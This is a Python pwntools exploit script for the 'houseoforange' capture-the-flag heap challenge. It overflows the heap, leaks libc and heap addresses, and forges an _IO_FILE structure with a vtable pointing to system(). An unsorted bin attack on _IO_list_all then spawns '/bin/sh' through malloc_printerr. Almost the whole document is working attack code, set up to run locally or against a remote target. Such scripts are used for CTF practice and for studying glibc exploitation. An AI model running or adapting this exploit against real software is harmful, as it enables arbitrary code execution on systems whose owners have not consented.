#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'houseoforange'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'
#libFile = './libc64-2.19.so'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('Your choice : ', str(1))
	sla('name :', str(size))
	sa('Name :', data)
	sla('Price of Orange:', str(16))
	sla('Orange:', '1');


def md(size, data):
	sla('Your choice : ', str(3))
	sla('name :', str(size))
	sa('Name:', data)
	sla('Price of Orange:', str(16))
	sla('Orange:', '1');

def dp():
	sla('Your choice : ', str(2))

def q():
	sla(':', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	main_arena = 0x3c4b20
	
	ad(0x10, 'A' * 0x10)
	p = 'A' * 0x10
	p += p64(0) + p64(0x21)
	p += p64(0x1f00000010)
	p += p64(0)
	p += p64(0)
	p += p64(0x00fa1)
	# top chunk size 0x20fa1
	# top chunk addr 0x555555758060
	# alignment: 555555779001 -> 0x1000
	li('addr: ' + hex(0xfa1 + 0x1000))
	md(0x80, p)

	ad(0x1000, 'B' * 0x10)

	# leak libc base with overflow
	ad(0x400, 'C' * 0x8)

	dp()
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - main_arena - 1640
	li('libc_base ' + hex(lib.address))

	# leak heap addr with large bin
	md(0x10, 'C' * 0x10)
	dp()
	ru('CCCCCCCCCCCCCCCC')
	heap = u64(ru('\x0a').ljust(8, '\x00')) - 0xc0
	li('heap ' + hex(heap))

	_IO_list_all = lib.sym['_IO_list_all']
	li('_IO_list_all ' + hex(_IO_list_all))

	# Control program
	p = 'B' * 0x400
	p += p64(0)
	p += p64(0x21)
	p += 'B' * 0x10

	# fake file
	f = '/bin/sh\x00' # flag overflow arg -> system('/bin/sh')
	f += p64(0x61)    # _IO_read_ptr small bin size
	#  unsoted bin attack
	f += p64(0) # _IO_read_end)
	f += p64(_IO_list_all - 0x10)  # _IO_read_base

	#bypass check
	# fp->_IO_write_base < fp->_IO_write_ptr

	# fp->mode <=0 ((addr + 0xc8) <= 0)
	f += p64(0) # _IO_write_base 
	f += p64(1) # _IO_write_ptr

	f += p64(0) # _IO_write_end
	f += p64(0) # _IO_buf_base
	f += p64(0) # _IO_buf_end
	f += p64(0) # _IO_save_base
	f += p64(0) # _IO_backup_base
	f += p64(0) # _IO_save_end
	f += p64(0) # *_markers
	f += p64(0) # *_chain

	f += p32(0) # _fileno
	f += p32(0) # _flags2

	f += p64(1)  # _old_offset

	f += p16(2) # ushort _cur_colum;
	f += p8(3)  # char _vtable_offset
	f += p8(4)  # char _shrotbuf[1]
	f += p32(0) # null for alignment

	f += p64(0) # _offset
	f += p64(6) # _codecvt
	f += p64(0) # _wide_data
	f += p64(0) # _freeres_list
	f += p64(0) # _freeres_buf

	f += p64(0) # __pad5
	f += p32(0) # _mode
	f += p32(0) # _unused2

	#f = f.ljust(0xc0, '\x00')

	p += f
	p += p64(0) * 3 # alignment to vtable
	p += p64(heap + 0x5C8) # vtable
	p += p64(0) * 2

	p += p64(lib.sym['system']) # 
	md(0x600, p)

	#db()
	sl('1') #get shell

	# malloc(0x10) -> malloc_printerr -> overflow(IO_FILE addr) -> system('/bin/sh')



def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
